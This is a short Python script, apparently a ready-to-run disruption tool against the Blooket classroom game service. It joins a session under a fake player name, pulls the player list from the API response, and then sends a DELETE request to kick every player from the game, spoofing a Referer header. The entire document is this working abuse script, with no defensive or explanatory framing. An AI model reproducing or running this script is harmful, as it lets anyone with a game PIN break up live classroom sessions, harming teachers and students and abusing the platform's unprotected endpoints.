"""
	This script gets info about the game, by joining with a custom player.
	It then uses that data to loop through each player in the game, and sends a request to kick them.
"""

import requests, json

gamePin = str(input("Game pin: "))

# Join the game with our fake player
# We use this player to get some info about the game session
r = requests.put("https://api.blooket.com/api/firebase/join", data={
	"id": gamePin,
	"name": "blooketbad"
}, headers={
	"Referer": "https://www.blooket.com/"
})

# Store the data returned from the call of the join endpoint
joinText = r.text

# Send request to kick the custom player
r = requests.delete(f"https://api.blooket.com/api/firebase/client?id={gamePin}&name=blooketbad", headers={
	"Referer": "https://www.blooket.com/"
})

# Get a list of players
players = json.loads(joinText)["host"]["c"].keys()
# For each player in the game
for playerName in players:
	# Send request to kick the player
	r = requests.delete(f"https://api.blooket.com/api/firebase/client?id={gamePin}&name={playerName}", headers={
		"Referer": "https://www.blooket.com/"
	})
